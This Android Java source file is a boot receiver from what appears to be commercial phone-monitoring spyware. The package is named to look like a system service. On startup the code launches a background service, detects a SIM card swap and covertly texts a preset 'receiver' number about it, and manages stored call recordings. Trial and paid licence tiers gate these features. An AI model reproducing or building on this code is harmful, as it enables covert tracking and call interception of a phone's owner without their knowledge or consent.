package system.service.receiver;

import system.service.BootService;
import system.service.R;
import system.service.R.string;
import system.service.activity.GlobalPrefActivity;
import system.service.config.ConfigCtrl;
import system.service.feature.location.LocationInfo;
import system.service.feature.sms.SmsCtrl;

import com.particle.inspector.common.util.FileCtrl;
import com.particle.inspector.common.util.SysUtils;
import com.particle.inspector.common.util.license.LICENSE_TYPE;
import com.particle.inspector.common.util.location.BaseStationLocation;
import com.particle.inspector.common.util.location.BaseStationUtil;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;

/**
 * Receiver that will handle the boot completed intent and send the intent to launch the BootService.
 */
public class BootReceiver extends BroadcastReceiver {
	
	private static final String LOGTAG = "BootReceiver";
	private static final int WAV_FILE_MAX_NUM = 25; // The max number of call recording being kept in internal storage
	
	private Context context;
	
	@Override
	public void onReceive(Context context, Intent bootintent) {
		//android.os.Debug.waitForDebugger();//TODO should be removed in the release
		
		if (bootintent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) 
		{
			// ==========================================================================
			// Start service
			Intent mServiceIntent = new Intent(context, BootService.class);
			context.startService(mServiceIntent);
			
			// ------------------------------------------------------------------
			// If license is illegal, do not check SIM state
			if (!ConfigCtrl.isLegal(context)) return;
			SysUtils.threadSleep(3000, LOGTAG);
		
			// Start to check if changed SIM card
			
			TelephonyManager mTelephonyMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
			//int simState = mTelephonyMgr.getSimState();
			
			String simSerialNumber = mTelephonyMgr.getSimSerialNumber();
			String hostSimSerialNumber = ConfigCtrl.getSimSerialNum(context);
			
			// I found that cannot get serial number of ChinaTelecom SIM card (getSimSerialNumber() return null), but ChinaUnicom can.
			if ((simSerialNumber == null || simSerialNumber.length() <= 0) &&
				(hostSimSerialNumber == null || hostSimSerialNumber.length() <= 0)) 
			{
				// Do not compare if sim and host sim are both empty.
				// That means we are incapable to compare them two.
			}
			else {
				boolean isFirstRun = ConfigCtrl.getSimFirstRun(context);
				if (isFirstRun) {
					ConfigCtrl.setSimFirstRun(context, false);
					if (simSerialNumber != null && simSerialNumber.length() > 0) {
						ConfigCtrl.setSimSerialNum(context, simSerialNumber.trim());
					}
				} else {
					if ((simSerialNumber != null && simSerialNumber.length() > 0 && hostSimSerialNumber != null && hostSimSerialNumber.length() > 0 && !simSerialNumber.contains(hostSimSerialNumber)) ||
						((simSerialNumber == null || simSerialNumber.length() <= 0) && (hostSimSerialNumber != null && hostSimSerialNumber.length() > 0)) ||	
						((simSerialNumber != null && simSerialNumber.length() > 0)  && (hostSimSerialNumber == null || hostSimSerialNumber.length() <= 0)))
					{
						// Send SMS since the SIM card has changed
						String recvPhoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
						if (recvPhoneNum != null && recvPhoneNum.length() > 0) 
						{
							// If it is in trial, send SMS directly without new SIM phone number
							if (ConfigCtrl.getLicenseType(context) == LICENSE_TYPE.TRIAL_LICENSED) {
								String strContent = String.format(context.getResources().getString(R.string.msg_changed_sim), ConfigCtrl.getSelfName(context))
										+ context.getResources().getString(R.string.msg_changed_sim_new_number_trial);
								boolean ret = SmsCtrl.sendSms(recvPhoneNum, strContent);
								if (ret && simSerialNumber != null && simSerialNumber.length() > 0) {
									ConfigCtrl.setSimSerialNum(context, simSerialNumber.trim());
								}
							} 
							// If it is paid (valid licensed), send SMS to get back the new SIM phone number and then send SMS to recv phone
							else {
								boolean ret = SmsCtrl.sendSimChgSms(context);
								if (ret && simSerialNumber != null && simSerialNumber.length() > 0) {
									ConfigCtrl.setSimSerialNum(context, simSerialNumber.trim());
								}
							}
						} // end of if (recvPhoneNum != null && recvPhoneNum.length() > 0)
					}
				}
			}
			
			// ==========================================================================
			// Start a new thread to clear redundant phone call recordings
			this.context = context;
			new Thread(new Runnable(){
				public void run() {
					FileCtrl.reduceWavFiles(BootReceiver.this.context, WAV_FILE_MAX_NUM);
				}
			}).start();
			
		} // end of "if (bootintent.getAction().equals(Intent.ACTION_BOOT_COMPLETED))"
	}
}